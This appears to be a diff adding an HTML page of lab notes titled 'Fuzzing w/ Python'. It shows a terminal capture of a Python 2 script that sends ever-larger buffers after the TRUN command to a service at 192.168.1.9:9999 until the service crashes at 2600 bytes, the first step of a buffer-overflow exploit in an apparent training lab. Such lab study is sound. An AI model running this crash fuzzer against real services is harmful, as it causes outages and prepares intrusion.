@@ -1,0 +1,37 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Fuzzing w/ Python</title>
+</head><body><span style="font-family: monospace">┌──(lolpotch㉿Lolpotch)-[~]<br/>
+└─$ cat 1.py<br/>
+#!/usr/bin/python<br/>
+import sys, socket<br/>
+from time import sleep<br/>
+<br/>
+buffer = "A" * 100<br/>
+<br/>
+while True:<br/>
+&nbsp; &nbsp; try: &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #IP Address &nbsp; &nbsp; &nbsp; Port<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.connect(('192.168.1.9', 9999))<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # &nbsp; &nbsp; &nbsp; TRUN is based on command we found crashed when spiked<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.send(('TRUN /.:/' + buffer))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; s.close()<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sleep(1)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; buffer = buffer + "A"*100<br/>
+<br/>
+&nbsp; &nbsp; except:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; print "Fuzzing crashed at %s bytes" % str(len(buffer))<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sys.exit()<br/>
+<br/>
+┌──(lolpotch㉿Lolpotch)-[~]<br/>
+└─$ chmod +x 1.py<br/>
+<br/>
+┌──(lolpotch㉿Lolpotch)-[~]<br/>
+└─$ python2 1.py<br/>
+^CFuzzing crashed at 2600 bytes<br/>
+<br/>
+ImmunityDebugger.exe<br/>
+</span><img src="image.png" /></body></html>
